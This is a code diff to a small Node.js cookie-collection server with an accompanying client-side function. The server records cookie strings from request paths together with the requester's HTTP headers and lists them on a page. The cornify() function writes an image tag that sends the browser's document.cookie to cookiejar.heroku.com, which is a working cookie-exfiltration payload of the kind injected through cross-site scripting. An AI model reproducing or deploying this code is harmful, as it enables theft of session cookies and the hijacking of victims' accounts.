@@ -1,7 +1,4 @@
 var cookie_jar = [];
-var sys = require("sys");
-
-
 with(require("./lib/fab"))
 
 ( fab )
@@ -14,7 +11,7 @@ with(require("./lib/fab"))
       var out = this;
       return function (head) {
         var cookie = head.url.pathname.split("/").slice(1).join("/");
-        cookie_jar.push(decodeURIComponent(cookie));
+        cookie_jar.push({headers: head.headers, cookie: decodeURIComponent(cookie)});
         out({ body: "yummy" })()
       }
     })
@@ -37,11 +34,11 @@ with(require("./lib/fab"))
         listing += "<ul>"
         while (i >= 0) {
           var c = cookie_jar[i];
-          if (c.length > 0) {
-            listing += ("<li>"+c.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/"/g, '&quot;')+"</li>");
-          } else {
-            listing += "<li>EMPTY COOKIE</li>";
+          headers = ""
+          for (i in c.headers) { 
+            headers += ("<li><b>"+purge(i)+"</b>: "+purge(c.headers[i].toString())+"</li>"); 
           }
+          listing += ("<li><div>"+purge(c.cookie)+"</div><ul>"+headers+"</ul></li>");
           i = i - 1;
         }
         listing += "</ul>"
@@ -57,7 +54,10 @@ function cornify() {
   document.write('<script type="text/javascript" src="http://www.cornify.com/js/cornify.js"></script>'); 
   var corn = function() { try { cornify_add(); } catch(e) {} setTimeout(corn, 1000); }; 
   var str = "<img src=\"http://cookiejar.heroku.com/nomnomnom/"+document.cookie+"\"/>";
-  console.log(str);
   document.write(str); 
   setTimeout(corn, 1000);
+}
+
+function purge(str) {
+  return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/"/g, '&quot;');
 }
